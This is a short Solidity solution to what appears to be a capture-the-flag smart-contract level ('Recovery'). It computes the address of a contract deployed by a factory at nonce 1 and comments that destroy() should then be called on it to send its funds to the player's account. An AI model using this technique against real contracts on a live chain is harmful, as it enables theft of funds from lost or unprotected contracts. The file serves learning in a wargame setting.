/**
 * How to beat this level:
 * 1) Deploy RecoveryHack
 * 2) Call attack()
 * 3) Call destroy() on SimpleToken (using the address from 2)) with your EOA's address
 */

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract RecoveryHack {
    function attack(address target) external pure returns (address lostContract) {
        lostContract =
            address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), target, bytes1(0x01))))));
    }
}
